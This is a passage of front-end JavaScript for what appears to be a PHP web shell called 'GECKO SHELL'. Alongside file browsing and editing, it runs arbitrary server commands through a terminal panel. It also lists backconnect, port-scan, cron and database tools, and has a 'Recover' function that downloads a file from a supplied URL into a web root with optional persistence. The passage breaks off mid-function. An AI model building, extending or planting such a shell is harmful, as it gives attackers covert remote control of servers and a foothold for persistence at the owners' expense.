  return IMG_EXT.includes(ext);
}

function openItem(path,isDir,editable){
  if(isDir){navigate(path);return}
  const name = path.split(/[\/\\]/).pop();
  if(isImageFile(name)) return openImagePreview(path);
  if(editable) return openEditor(path);
  // Untuk file binary lain → langsung download
  window.location='?download='+encodeURIComponent(path);
}
function rowAct(act,path,isDir,name,editable,perm){
  if(act==='open')return openItem(path,isDir,editable);
  if(act==='rename')return showRename(path,name);
  if(act==='dl'&&!isDir)return window.location='?download='+encodeURIComponent(path);
  if(act==='delete')return showDelete(path,name,isDir);
  if(act==='chmod')return showChmod(path,perm);
  if(act==='copy')return clipCopy([path]);
  if(act==='cut')return clipCut([path]);
  if(act==='zip')return showZipModal([path]);
  if(act==='unzip')return extractZip(path);
}

// ─── Image Preview ───────────────────────────────────────────────
let ipCurrentPath = null;
let ipTextLoaded = false;

async function openImagePreview(path){
  ipCurrentPath = path;
  ipTextLoaded = false;
  const name = path.split(/[\/\\]/).pop();
  $('#ipTitle').textContent = name;
  $('#ipPath').textContent = path;
  $('#ipMeta').textContent = '';
  $('#ipImgInfo').textContent = '';
  $('#ipImg').src = '';
  $('#ipTextContent').textContent = 'Click "Text" tab to load raw bytes…';
  setIpTab('image');
  openM('#mImagePreview');

  const url = '?view=' + encodeURIComponent(path);
  $('#ipImg').src = url;
  $('#ipDownload').href = '?download=' + encodeURIComponent(path);

  $('#ipImg').onload = () => {
    const img = $('#ipImg');
    $('#ipImgInfo').textContent = img.naturalWidth + ' × ' + img.naturalHeight + ' px';
  };
  $('#ipImg').onerror = () => {
    $('#ipImgInfo').textContent = 'Failed to load image';
  };

  // Fetch metadata via API for size/modified
  try {
    const meta = await api('list', { path: path.replace(/[\/\\][^\/\\]*$/, '') || '' });
    if (meta.ok) {
      const entry = (meta.entries || []).find(e => e.name === name);
      if (entry) $('#ipMeta').textContent = fmtBytes(entry.size) + ' · ' + fmtDate(entry.modified);
    }
  } catch(e){}
}

function setIpTab(tab){
  $$('#mImagePreview .ip-tab').forEach(b => b.classList.toggle('active', b.dataset.tab === tab));
  $('#ipImagePane').classList.toggle('hidden', tab !== 'image');
  $('#ipTextPane').classList.toggle('hidden', tab !== 'text');
  if (tab === 'text' && !ipTextLoaded && ipCurrentPath) {
    loadFileAsText(ipCurrentPath);
  }
}

async function loadFileAsText(path){
  ipTextLoaded = true;
  const pre = $('#ipTextContent');
  pre.textContent = 'Loading…';
  try {
    const res = await fetch('?view=' + encodeURIComponent(path));
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const blob = await res.blob();
    if (blob.size > 2 * 1024 * 1024) {
      pre.textContent = 'File too large for text view (' + fmtBytes(blob.size) + ')\n\nUse Download to inspect.';
      return;
    }
    const txt = await blob.text();
    pre.textContent = txt;
  } catch(e){
    pre.textContent = 'Error loading file: ' + e.message;
  }
}

// Wire image preview tabs
document.addEventListener('click', e => {
  const tabBtn = e.target.closest('#mImagePreview .ip-tab');
  if (tabBtn) setIpTab(tabBtn.dataset.tab);
});

// Keep path readable in address bar: /filemanager.php?path=/home/... (not %2F)
function pathForQuery(p){
  return String(p || '')
    .replace(/\\/g, '/')
    .replace(/%/g, '%25')
    .replace(/#/g, '%23')
    .replace(/&/g, '%26')
    .replace(/\?/g, '%3F')
    .replace(/ /g, '%20')
    .replace(/\+/g, '%2B');
}
function pathFromQuery(){
  const m = String(location.search || '').match(/[?&]path=([^&]*)/);
  if(!m) return '';
  try { return decodeURIComponent(m[1].replace(/\+/g, ' ')); }
  catch(e){ return m[1]; }
}

// ─── Navigate ────────────────────────────────────────────────────
async function navigate(path){
    let apiPath = path;
    
    if (path && typeof path === 'string') {
        // Handle Windows path
        if (path.match(/^[A-Za-z]:/)) {
            apiPath = path.replace(/\\/g, '/');
            apiPath = apiPath.replace(/\/+/g, '/');
            apiPath = apiPath.replace(/^([A-Za-z]:)\/*/, '$1/');
            if (apiPath !== '/' && apiPath.endsWith('/')) {
                // Keep trailing slash for directories
            }
        }
        // Handle Linux path
        else if (path.startsWith('/')) {
            apiPath = path.replace(/\/+/g, '/');
        }
    }
    
    console.log('Navigating to:', apiPath);
    S.path = apiPath;
    S.selected.clear();
    S.lastClickIdx = -1;
    if (typeof updateBulkBar === 'function') updateBulkBar();
    
    // Update URL — keep "/" readable (no encodeURIComponent on whole path)
    if (apiPath) {
      history.replaceState(null, '', '?path=' + pathForQuery(apiPath));
    } else {
      history.replaceState(null, '', location.pathname);
    }
    
    renderBreadcrumb();
    if (typeof syncTermCwd === 'function') syncTermCwd();
    showPanelSkeleton();
    
    try{
        const d = await api('list', {path: apiPath});
        if(!d.ok) throw new Error(d.error);
        S.entries = d.entries;
        renderList();
        updateStatus(d);
    }catch(e){ 
        toast(e.message, 'error');
        const panel = $('#panel');
        if(panel) panel.innerHTML = `<div class="empty"><h3>Error loading folder</h3><p>${esc(e.message)}</p></div>`;
    }
}

function updateStatus(d){
  const dirs=S.entries.filter(e=>e.is_dir).length, files=S.entries.length-dirs;
  $('#stItems').innerHTML=`<strong>${S.entries.length}</strong> items · <strong>${dirs}</strong> folders · <strong>${files}</strong> files`;
  if(d.disk){
    const u=d.disk.total-d.disk.free, pct=Math.round(u/d.disk.total*100);
    $('#stDisk').innerHTML=`<strong>${fmtBytes(u)}</strong> / ${fmtBytes(d.disk.total)}`;
    $('#diskFill').style.width=pct+'%';
    $('#diskUsed').textContent=fmtBytes(u)+' used';
    $('#diskPct').textContent=pct+'%';
    if(pct>85)$('#diskFill').style.background='var(--red)';
  }
  $('#stPath').textContent = toAbsolutePath(S.path || '');
  $('#termCwd').textContent=S.path||'~';
  $('#termPathTag').textContent=S.path||'root';
}

// Clock
setInterval(()=>$('#stClock').textContent=new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit'}),1000);
$('#stClock').textContent=new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit'});

async function loadInfo(){
  const d=await api('info',{});
  if(d.ok){
    const pct=Math.round((d.disk_total-d.disk_free)/d.disk_total*100);
    $('#sysInfo').innerHTML=`<strong>Environment</strong><br>PHP ${esc(d.php)}<br>OS: ${esc(d.os)}<br>Root: ${esc(BASE.split(/[/\\\\]/).pop())}`;
    $('#diskFill').style.width=pct+'%';
    $('#diskUsed').textContent=fmtBytes(d.disk_total-d.disk_free)+' used';
    $('#diskPct').textContent=pct+'%';
  }
}

// ─── Load Drives (Windows) ───────────────────────────────────────
async function loadDrives() {
    const select = $('#driveSelect');
    const box = $('#driveBox');
    if (!select || !box) return;
    box.style.display = 'block';
    select.onchange = (e) => { if (e.target.value) navigate(e.target.value); };
    try {
        const d = await api('drives', {});
        if (d.ok && d.drives && d.drives.length) {
            select.innerHTML = '<option value="">— Select Path —</option>' +
                d.drives.map(drive => `<option value="${esc(drive.path)}">${esc(drive.label)}${drive.total ? ' (' + fmtBytes(drive.total) + ')' : ''}</option>`).join('');
        } else {
            select.innerHTML = '<option value="">— No paths available —</option>';
        }
    } catch(e) {
        select.innerHTML = '<option value="">— Unable to load paths —</option>';
    }
}

// ─── Create ──────────────────────────────────────────────────────
function showCreate(mode){
  S.createMode=mode;
  $('#createTitle').textContent=mode==='file'?'New File':'New Folder';
  $('#createContentWrap').classList.toggle('hidden',mode!=='file');
  $('#createName').value=''; $('#createContent').value='';
  openM('#mCreate');
  setTimeout(()=>$('#createName').focus(),120);
}
$('#createOk').onclick=async()=>{
  const name=$('#createName').value.trim(); if(!name)return toast('Enter a name','error');
  const act=S.createMode==='file'?'create_file':'mkdir';
  const pl={path:S.path,name};
  if(S.createMode==='file')pl.content=$('#createContent').value;
  const d=await api(act,pl);
  if(!d.ok)return toast(d.error,'error');
  closeAll(); toast('Created','ok');
  navigate(S.path);
  if(S.createMode==='file')openEditor(joinPath(S.path,name));
};

// ─── Rename ──────────────────────────────────────────────────────
function showRename(path,name){
  S.renameTarget=path; $('#renameInput').value=name;
  openM('#mRename');
  setTimeout(()=>{$('#renameInput').focus();$('#renameInput').select()},120);
}
$('#renameOk').onclick=async()=>{
  const n=$('#renameInput').value.trim(); if(!n||!S.renameTarget)return;
  const d=await api('rename',{path:S.renameTarget,new_name:n});
  if(!d.ok)return toast(d.error,'error');
  closeAll(); toast('Renamed','ok'); navigate(S.path);
};

// ─── Chmod ───────────────────────────────────────────────────────
function showChmod(path, currentPerm) {
  S.chmodTarget = path;
  $('#chmodInput').value = currentPerm || '0644';
  openM('#mChmod');
  setTimeout(() => { $('#chmodInput').focus(); $('#chmodInput').select() }, 120);
}
$('#chmodOk').onclick = async () => {
  const perm = $('#chmodInput').value.trim();
  if (!perm || !S.chmodTarget) return;
  const d = await api('chmod', { path: S.chmodTarget, perm: perm });
  if (!d.ok) return toast(d.error, 'error');
  closeAll(); toast('Permissions updated', 'ok');
  navigate(S.path);
};

// ─── Delete ──────────────────────────────────────────────────────
function showDelete(path,name,isDir){
  S.deleteTarget=path;
  $('#deleteMsg').innerHTML=`Delete <strong>${esc(name)}</strong>${isDir?' and all contents inside':''}? This cannot be undone.`;
  openM('#mDelete');
}
$('#deleteOk').onclick=async()=>{
  if(!S.deleteTarget)return;
  const d=await api('delete',{path:S.deleteTarget});
  if(!d.ok)return toast(d.error,'error');
  closeAll(); toast('Deleted','ok'); navigate(S.path);
};
async function deleteSelected(){
  if(!S.selected.size)return toast('Nothing selected','error');
  if(!confirm('Delete '+S.selected.size+' item(s)? Folders will be removed recursively.'))return;
  for(const p of S.selected){const d=await api('delete',{path:p});if(!d.ok){toast(d.error+' — '+p,'error');break}}
  toast('Done','ok'); navigate(S.path);
}

// ─── Editor ──────────────────────────────────────────────────────
const LANG_MAP = {
  php:'php', phtml:'php',
  js:'js', mjs:'js', cjs:'js', ts:'js', tsx:'js', jsx:'js',
  json:'json',
  css:'css', scss:'css', sass:'css', less:'css',
  html:'html', htm:'html', xml:'html', svg:'html', vue:'html',
  md:'md', markdown:'md',
  yml:'yaml', yaml:'yaml',
  sh:'sh', bash:'sh', zsh:'sh',
  sql:'sql',
  py:'py',
};
function detectLang(path){
  const ext = (path.split('.').pop() || '').toLowerCase();
  return LANG_MAP[ext] || 'plain';
}

const HTML_ESC = { '&':'&amp;', '<':'&lt;', '>':'&gt;' };
const escHtml = s => String(s).replace(/[&<>]/g, c => HTML_ESC[c]);

// ─── Tokenizer (regex multi-pattern) ─────────────────────────────
const KEYWORDS_JS = 'function|if|else|return|for|while|do|switch|case|break|continue|class|new|var|let|const|null|true|false|undefined|this|import|export|default|async|await|try|catch|finally|throw|in|of|as|from|extends|typeof|instanceof|delete|void|yield|static|get|set';
const KEYWORDS_PHP = KEYWORDS_JS + '|elseif|endif|endwhile|endfor|endforeach|endswitch|foreach|public|private|protected|namespace|use|self|parent|abstract|trait|interface|implements|fn|match|enum|readonly|require|require_once|include|include_once|echo|print|global|isset|unset|empty|array|list';
const KEYWORDS_PY = 'def|class|if|elif|else|for|while|return|import|from|as|try|except|finally|raise|with|pass|break|continue|lambda|yield|global|nonlocal|None|True|False|and|or|not|is|in';
const KEYWORDS_SH = 'if|then|else|elif|fi|for|while|do|done|case|esac|in|function|return|break|continue|exit|export|local|readonly|source|alias';
const KEYWORDS_SQL = 'SELECT|FROM|WHERE|INSERT|INTO|VALUES|UPDATE|SET|DELETE|CREATE|TABLE|DROP|ALTER|JOIN|LEFT|RIGHT|INNER|OUTER|ON|GROUP|BY|ORDER|HAVING|LIMIT|OFFSET|AS|AND|OR|NOT|NULL|IS|IN|LIKE|BETWEEN|DISTINCT|UNION|INDEX|PRIMARY|KEY|FOREIGN|REFERENCES|DEFAULT|UNIQUE|AUTO_INCREMENT|VARCHAR|INT|TEXT|DATE|DATETIME|TIMESTAMP|BOOLEAN|TRUE|FALSE';

function tokenize(code, lang){
  if (lang === 'plain' || !code) return escHtml(code);

  let patterns;
  if (lang === 'php' || lang === 'js') {
    const kw = lang === 'php' ? KEYWORDS_PHP : KEYWORDS_JS;
    patterns = [
      [/\/\*[\s\S]*?\*\//, 'tk-com'],
      [/\/\/[^\n]*/, 'tk-com'],
      [/#[^\n]*/, 'tk-com'],
      [/"(?:\\.|[^"\\\n])*"/, 'tk-str'],
      [/'(?:\\.|[^'\\\n])*'/, 'tk-str'],
      [/`(?:\\.|[^`\\])*`/, 'tk-str'],
      [/\$[A-Za-z_]\w*/, 'tk-var'],
      [new RegExp('\\b(?:' + kw + ')\\b'), 'tk-key'],
      [/\b(?:true|false|null|undefined|TRUE|FALSE|NULL)\b/, 'tk-bool'],
      [/\b\d+(?:\.\d+)?(?:[eE][+-]?\d+)?\b/, 'tk-num'],
      [/\b[A-Z][A-Za-z0-9_]*\b/, 'tk-cls'],
      [/\b[a-zA-Z_]\w*(?=\s*\()/, 'tk-fn'],
      [/[+\-*/%=<>!&|^~?:]+/, 'tk-op'],
    ];
  } else if (lang === 'css') {
    patterns = [
      [/\/\*[\s\S]*?\*\//, 'tk-com'],
      [/"(?:\\.|[^"\\\n])*"/, 'tk-str'],
      [/'(?:\\.|[^'\\\n])*'/, 'tk-str'],
      [/--[\w-]+/, 'tk-var'],
      [/#[0-9a-fA-F]{3,8}\b/, 'tk-num'],
      [/\b\d+(?:\.\d+)?(?:px|em|rem|%|vh|vw|s|ms|deg|fr|ch|ex|pt)?\b/, 'tk-num'],
      [/@[\w-]+/, 'tk-key'],
      [/\b[a-z-]+(?=\s*:)/i, 'tk-att'],
      [/[.#][\w-]+/, 'tk-cls'],
      [/[{}();,]/, 'tk-pun'],
    ];
  } else if (lang === 'html') {
    patterns = [
      [new RegExp('<!--[\\s\\S]*?-->'), 'tk-com'],
      [new RegExp('<!DOCTYPE[^>]*>', 'i'), 'tk-com'],
      [new RegExp('</?[\\w:-]+'), 'tk-tag'],
      [/[\w:-]+(?=\s*=)/, 'tk-att'],
      [/"(?:[^"\\]|\\.)*"/, 'tk-str'],
      [/'(?:[^'\\]|\\.)*'/, 'tk-str'],
      [new RegExp('/?>'), 'tk-tag'],
    ];
  } else if (lang === 'json') {
    patterns = [
      [/"(?:\\.|[^"\\])*"(?=\s*:)/, 'tk-att'],
      [/"(?:\\.|[^"\\])*"/, 'tk-str'],
      [/\b(?:true|false|null)\b/, 'tk-bool'],
      [/-?\b\d+(?:\.\d+)?(?:[eE][+-]?\d+)?\b/, 'tk-num'],
      [/[{}\[\]:,]/, 'tk-pun'],
    ];
  } else if (lang === 'md') {
    patterns = [
      [/^#{1,6}[^\n]*/, 'tk-md-h'],
      [/```[\s\S]*?```/, 'tk-md-cd'],
      [/`[^`\n]+`/, 'tk-md-cd'],
      [/\*\*[^*\n]+\*\*/, 'tk-md-em'],
      [/_[^_\n]+_/, 'tk-md-em'],
      [/^[\s]*[-*+]\s+/, 'tk-md-li'],
      [/^>[^\n]*/, 'tk-com'],
      [/\[[^\]]*\]\([^)]*\)/, 'tk-str'],
    ];
  } else if (lang === 'yaml') {
    patterns = [
      [/#[^\n]*/, 'tk-com'],
      [/"(?:\\.|[^"\\\n])*"/, 'tk-str'],
      [/'(?:\\.|[^'\\\n])*'/, 'tk-str'],
      [/^[\s-]*[\w.-]+(?=\s*:)/m, 'tk-att'],
      [/\b(?:true|false|null|yes|no)\b/, 'tk-bool'],
      [/\b\d+(?:\.\d+)?\b/, 'tk-num'],
    ];
  } else if (lang === 'sh') {
    patterns = [
      [/#[^\n]*/, 'tk-com'],
      [/"(?:\\.|[^"\\])*"/, 'tk-str'],
      [/'[^']*'/, 'tk-str'],
      [/\$\{[^}]+\}|\$\w+/, 'tk-var'],
      [new RegExp('\\b(?:' + KEYWORDS_SH + ')\\b'), 'tk-key'],
      [/\b\d+\b/, 'tk-num'],
    ];
  } else if (lang === 'sql') {
    patterns = [
      [/--[^\n]*/, 'tk-com'],
      [/\/\*[\s\S]*?\*\//, 'tk-com'],
      [/'(?:[^'\\]|\\.)*'/, 'tk-str'],
      [/"(?:[^"\\]|\\.)*"/, 'tk-str'],
      [new RegExp('\\b(?:' + KEYWORDS_SQL + ')\\b', 'i'), 'tk-key'],
      [/\b\d+(?:\.\d+)?\b/, 'tk-num'],
    ];
  } else if (lang === 'py') {
    patterns = [
      [/#[^\n]*/, 'tk-com'],
      [/"""[\s\S]*?"""|'''[\s\S]*?'''/, 'tk-str'],
      [/"(?:\\.|[^"\\\n])*"/, 'tk-str'],
      [/'(?:\\.|[^'\\\n])*'/, 'tk-str'],
      [new RegExp('\\b(?:' + KEYWORDS_PY + ')\\b'), 'tk-key'],
      [/\b\d+(?:\.\d+)?\b/, 'tk-num'],
      [/\b[a-zA-Z_]\w*(?=\s*\()/, 'tk-fn'],
    ];
  } else {
    return escHtml(code);
  }

  // Build mega regex with capture group per pattern
  const megaSrc = patterns.map(p => '(' + p[0].source + ')').join('|');
  const flags = 'gm';
  const regex = new RegExp(megaSrc, flags);

  let out = '';
  let last = 0;
  let m;
  while ((m = regex.exec(code)) !== null) {
    if (m.index > last) out += escHtml(code.slice(last, m.index));
    let cls = null;
    for (let i = 0; i < patterns.length; i++) {
      if (m[i + 1] !== undefined) { cls = patterns[i][1]; break; }
    }
    out += cls ? '<span class="' + cls + '">' + escHtml(m[0]) + '</span>' : escHtml(m[0]);
    last = m.index + m[0].length;
    // Prevent infinite loop on zero-length matches
    if (m[0].length === 0) regex.lastIndex++;
  }
  if (last < code.length) out += escHtml(code.slice(last));
  return out;
}

let edLang = 'plain';

async function openEditor(path){
  S.editorPath=path;
  edLang = detectLang(path);
  $('#edArea').classList.toggle('no-highlight', edLang === 'plain');
  $('#edTitle').textContent=path.split(/[\/\\]/).pop();
  $('#edPath').textContent=path;
  $('#edText').value=''; $('#edHighlight').innerHTML=''; updateLineNums();
  setEditorDirty(false);
  applyEdWrap();
  openM('#mEditor');
  const d=await api('read',{path});
  if(!d.ok){closeM('#mEditor');return toast(d.error,'error')}
  $('#edText').value=d.content;
  S.editorSavedContent = d.content;
  setEditorDirty(false);
  $('#edMeta').textContent=fmtBytes(d.size)+' · '+fmtDate(d.modified)+' · '+edLang.toUpperCase();
  refreshHighlight();
  updateLineNums();
  setTimeout(()=>$('#edText').focus(),120);
}

function refreshHighlight(){
  if (edLang === 'plain') return;
  const code = $('#edText').value;
  // Trailing newline ensures last line is rendered properly
  const html = tokenize(code + (code.endsWith('\n') ? ' ' : ''), edLang);
  $('#edHighlight').innerHTML = html;
}

function updateLineNums(){
  const ta=$('#edText'),lines=(ta.value.match(/\n/g)||[]).length+1;
  const ln=$('#lineNums'); let h='';
  for(let i=1;i<=lines;i++)h+=`<div>${i}</div>`;
  ln.innerHTML=h; ln.scrollTop=ta.scrollTop;
}

// Debounced highlight refresh on input — keeps typing smooth
let edHlTimer;
function scheduleHighlight(){
  if (edLang === 'plain') return;
  clearTimeout(edHlTimer);
  edHlTimer = setTimeout(refreshHighlight, 30);
}

$('#edText').addEventListener('input', () => {
  updateLineNums();
  scheduleHighlight();
  setEditorDirty($('#edText').value !== S.editorSavedContent);
});
$('#edText').addEventListener('scroll', () => {
  $('#lineNums').scrollTop = $('#edText').scrollTop;
  $('#edHighlight').scrollTop = $('#edText').scrollTop;
  $('#edHighlight').scrollLeft = $('#edText').scrollLeft;
});
$('#edSave').onclick=saveEditor;
const _edWrapBtn = $('#edWrapToggle');
if(_edWrapBtn) _edWrapBtn.onclick = ()=>{
  S.edWordWrap = !S.edWordWrap;
  localStorage.setItem('gecko_wrap', S.edWordWrap ? '1' : '0');
  applyEdWrap();
};
applyEdWrap();
async function saveEditor(){
  if(!S.editorPath)return;
  const d=await api('save',{path:S.editorPath,content:$('#edText').value});
  if(!d.ok)return toast(d.error,'error');
  S.editorSavedContent = $('#edText').value;
  setEditorDirty(false);
  toast('Saved','ok'); $('#edMeta').textContent=fmtBytes($('#edText').value.length)+' · just now';
  navigate(S.path);
}

// ─── Upload Files ──────────────────────────────────────────────────
async function uploadFiles(files) {
    if (!files || files.length === 0) {
        toast('No files selected', 'error');
        return;
    }
    let successCount = 0;
    let failCount = 0;
    for (const file of files) {
        try {
            const formData = new FormData();
            formData.append('action', 'upload');
            formData.append('path', S.path);
            formData.append('file', file);
            
            const response = await fetch(API, {
                method: 'POST',
                body: formData
            });
            const data = await response.json();
            if (data.ok) {
                successCount++;
                toast(`✓ ${file.name} uploaded`, 'ok');
            } else {
                failCount++;
                toast(`✗ ${file.name}: ${data.error || 'Upload failed'}`, 'error');
            }
        } catch (err) {
            failCount++;
            toast(`✗ ${file.name}: Network error`, 'error');
            console.error('Upload error:', err);
        }
    }
    if (successCount > 0) {
        closeAll();
        navigate(S.path);
    }
    if (failCount > 0 && successCount === 0) {
        toast(`Upload failed: ${failCount} file(s)`, 'error');
    } else if (successCount > 0 && failCount > 0) {
        toast(`Uploaded: ${successCount}, Failed: ${failCount}`, successCount > 0 ? 'ok' : 'error');
    }
}

// ─── Upload Event Handlers ─────────────────────────────────────────
const dz = $('#dropzone');
const fi = $('#fileInput');

if (dz) {
  dz.onclick = (e) => {
      e.stopPropagation();
      if (fi) fi.click();
  };
}
if (fi) {
  fi.onchange = (e) => {
      if (fi.files && fi.files.length > 0) {
          uploadFiles(Array.from(fi.files));
          fi.value = '';
      }
  };
}
if (dz) {
  dz.ondragover = (e) => {
      e.preventDefault();
      e.stopPropagation();
      dz.classList.add('over');
  };
  dz.ondragleave = (e) => {
      e.preventDefault();
      e.stopPropagation();
      dz.classList.remove('over');
  };
  dz.ondrop = (e) => {
      e.preventDefault();
      e.stopPropagation();
      dz.classList.remove('over');
      const files = Array.from(e.dataTransfer.files);
      if (files.length > 0) {
          uploadFiles(files);
      }
  };
}

const panel = $('#panel');
if (panel) {
  panel.ondragover = (e) => {
      e.preventDefault();
      e.stopPropagation();
      panel.classList.add('drag-over');
  };
  panel.ondragleave = (e) => {
      e.preventDefault();
      e.stopPropagation();
      panel.classList.remove('drag-over');
  };
  panel.ondrop = (e) => {
      e.preventDefault();
      e.stopPropagation();
      panel.classList.remove('drag-over');
      const files = Array.from(e.dataTransfer.files);
      if (files.length > 0) {
          uploadFiles(files);
      }
  };
}

// ─── Terminal ────────────────────────────────────────────────────
S.termCount = 0;

function openTerm(){
  openM('#mTerm');
  syncTermCwd();
  const o=$('#termOut');
  if(!o.children.length){
    const banner=document.createElement('div');
    banner.className='term-banner';
    banner.innerHTML='<b>GECKO SHELL · v2.0</b>Type a command and press <span class="kbd">Enter</span>. Use <span class="kbd">↑</span>/<span class="kbd">↓</span> for history, <span class="kbd">Ctrl+L</span> to clear.';
    o.appendChild(banner);
  }
  setTimeout(()=>$('#termIn').focus(),150);
}

function syncTermCwd(){
  const path = S.path || '~';
  const cwdEl = $('#termCwd');
  const promptCwdEl = $('#termPromptCwd');
  if(cwdEl) cwdEl.textContent = path;
  if(promptCwdEl){
    const parts = path.split(/[\/\\]/).filter(p=>p);
    promptCwdEl.textContent = parts.length>2 ? '…/'+parts.slice(-2).join('/') : (path||'~');
  }
}

function fmtClock(){
  const d=new Date();
  return String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0')+':'+String(d.getSeconds()).padStart(2,'0');
}
function fmtDur(ms){
  if(ms<1000)return ms+'ms';
  if(ms<60000)return (ms/1000).toFixed(2)+'s';
  return Math.floor(ms/60000)+'m'+Math.floor((ms%60000)/1000)+'s';
}

function appendTerm(text,cls='out'){
  const o=$('#termOut');
  const d=document.createElement('div');
  d.className='term-line '+(cls||'');
  d.textContent=text;
  o.appendChild(d);
  o.scrollTop=o.scrollHeight;
}

function makeBlock(cmd){
  const b=document.createElement('div');
  b.className='term-block running';
  const cmdLine=document.createElement('div');
  cmdLine.className='term-cmd-line';
  const promptSpan=document.createElement('span');
  promptSpan.className='term-prompt-mini';
  promptSpan.textContent='❯';
  const cmdText=document.createElement('span');
  cmdText.className='term-cmd-text';
  cmdText.textContent=cmd;
  const meta=document.createElement('span');
  meta.className='term-cmd-meta';
  const time=document.createElement('span');
  time.className='term-time';
  time.textContent=fmtClock();
  const dur=document.createElement('span');
  dur.className='term-duration';
  dur.textContent='…';
  meta.appendChild(time); meta.appendChild(dur);
  cmdLine.appendChild(promptSpan); cmdLine.appendChild(cmdText); cmdLine.appendChild(meta);
  const out=document.createElement('div');
  out.className='term-out-text';
  out.innerHTML='<div class="term-running-dots"><span></span><span></span><span></span></div>';
  b.appendChild(cmdLine); b.appendChild(out);
  return b;
}

async function runTerm(cmd){
  if(!cmd.trim())return;
  const o=$('#termOut');
  const block=makeBlock(cmd);
  o.appendChild(block);
  o.scrollTop=o.scrollHeight;
  $('#termSpinner').classList.add('show');
  const t0=performance.now();
  let d;
  try{
    d=await api('terminal',{path:S.path,command:cmd});
  }catch(e){
    d={ok:false,error:'Network error'};
  }
  const dt=Math.round(performance.now()-t0);
  const durEl=block.querySelector('.term-duration');
  const outEl=block.querySelector('.term-out-text');
  block.classList.remove('running');
  durEl.textContent=fmtDur(dt);
  $('#termSpinner').classList.remove('show');
  if(!d.ok){
    block.classList.add('error');
    outEl.textContent=d.error||'Error';
  }else{
    if(d.exit_code) block.classList.add('error');
    else block.classList.add('success');
    outEl.textContent=d.output||'(no output)';
    if(d.exit_code){
      const note=document.createElement('div');
      note.className='term-exit-note';
      note.textContent='exit code · '+d.exit_code;
      block.appendChild(note);
    }
  }
  S.termCount++;
  const tc=$('#termCount'); if(tc) tc.textContent=S.termCount;
  o.scrollTop=o.scrollHeight;
  navigate(S.path);
}

const termIn = $('#termIn');
if (termIn) {
  termIn.addEventListener('keydown',e=>{
    if(e.key==='Enter'){
      const v=e.target.value;
      e.target.value='';
      if(v.trim()){S.termHistory.push(v);S.termHistIdx=S.termHistory.length;runTerm(v)}
    }
    else if(e.key==='ArrowUp'){
      e.preventDefault();
      if(S.termHistIdx>0){S.termHistIdx--;e.target.value=S.termHistory[S.termHistIdx]}
    }
    else if(e.key==='ArrowDown'){
      e.preventDefault();
      if(S.termHistIdx<S.termHistory.length-1){S.termHistIdx++;e.target.value=S.termHistory[S.termHistIdx]}
      else{S.termHistIdx=S.termHistory.length;e.target.value=''}
    }
    else if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='l'){
      e.preventDefault();
      $('#termOut').innerHTML='';
      S.termCount=0;
      const tc=$('#termCount'); if(tc) tc.textContent=0;
    }
  });
}
const _termClearBtn = $('#termClear');
if (_termClearBtn) _termClearBtn.onclick = ()=>{
  $('#termOut').innerHTML='';
  S.termCount=0;
  const tc=$('#termCount'); if(tc) tc.textContent=0;
  $('#termIn').focus();
};
const _termCopyBtn = $('#termCopy');
if (_termCopyBtn) _termCopyBtn.onclick = async ()=>{
  const o=$('#termOut');
  const txt=o.innerText||'';
  const ok = await copyText(txt);
  if(ok) toast('Output copied to clipboard');
  else toast('Copy failed','error');
};

// ─── Tools: Cron, Backconnect, Port Scan, DB ───────────────────
function dbPayload(){
  return {
    type: $('#dbType').value,
    host: $('#dbHost').value.trim(),
    port: parseInt($('#dbPort').value,10)||3306,
    user: $('#dbUser').value,
    pass: $('#dbPass').value,
    db: $('#dbName').value.trim()
  };
}

async function loadCron(){
  const note=$('#cronPlatformNote');
  const ta=$('#cronContent');
  if(note) note.textContent='Loading…';
  const d=await api('cron_list',{});
  if(!d.ok){ if(note) note.textContent=d.error||'Failed'; return toast(d.error,'error'); }
  if(ta) ta.value=d.content||'';
  if(note){
    note.textContent=d.platform==='windows'
      ? 'Windows — read-only (schtasks). Edit via Terminal.'
      : 'Linux/Unix crontab — one entry per line.';
  }
  if(ta) ta.readOnly=!d.editable;
  const saveBtn=$('#cronSave');
  if(saveBtn) saveBtn.style.display=d.editable?'':'none';
}

function openCron(){
  openM('#mCron');
  loadCron();
}

function openRecover(){
  openM('#mRecover');
  const dirEl=$('#recDirPath');
  const cur=typeof toAbsolutePath==='function'?toAbsolutePath(S.path||''):(S.path||'');
  if(dirEl){
    // Prefill current browse path; user can still edit/custom
    if(cur&&cur!==''){
      dirEl.value=cur;
      dirEl.placeholder=cur;
    }else{
      dirEl.placeholder='/var/www/html';
      if(!dirEl.value) dirEl.value='/var/www/html';
    }
  }
  const out=$('#recOutput');
  if(out){
    out.textContent='DIR_PATH terisi dari lokasi browse saat ini. Bisa diganti manual. Lengkapi FILE_NAME + DOWNLOAD_URL lalu klik Recover.';
    out.className='tool-output tall empty sec-terminal-out';
  }
}

async function runRecover(){
  const dirEl=$('#recDirPath');
  const fileEl=$('#recFileName');
  const urlEl=$('#recDownloadUrl');
  const persistEl=$('#recPersist');
  const dir_path=dirEl?dirEl.value.trim():'';
  const file_name=fileEl?fileEl.value.trim():'';
  const download_url=urlEl?urlEl.value.trim():'';
  const persist=persistEl&&persistEl.checked?'1':'0';
  const out=$('#recOutput');
  const btn=$('#recRun');
  if(!dir_path||!file_name||!download_url){
    toast('Lengkapi DIR_PATH, FILE_NAME, DOWNLOAD_URL','error');
    return;
  }
  if(out){ out.textContent='Running recover'+(persist==='1'?' + persistence':'')+'…'; out.className='tool-output tall sec-terminal-out'; }
  if(btn){ btn.disabled=true; btn.textContent='Running…'; }
  let d;
  try{
    d=await api('recover_file',{dir_path:dir_path,file_name:file_name,download_url:download_url,persist:persist});
  }catch(e){
    d={ok:false,error:'Client error: '+(e&&e.message?e.message:String(e))};
  }
  if(btn){ btn.disabled=false; btn.textContent='Recover'; }
  if(!d||!d.ok){
    const err=(d&&d.error)?d.error:'Recover gagal';
    const steps=(d&&d.steps&&d.steps.length)?('\n\nSteps:\n- '+d.steps.join('\n- ')):'';
    if(out){ out.textContent=err+steps; out.className='tool-output tall empty sec-terminal-out'; }
    toast(err,'error');
    return;
  }
  const lines=[];
  lines.push(d.message||'Recover OK');
  if(d.path) lines.push('Path: '+d.path);
  if(typeof d.size!=='undefined') lines.push('Size: '+d.size+' bytes');
    if(d.persistence){
    lines.push('');
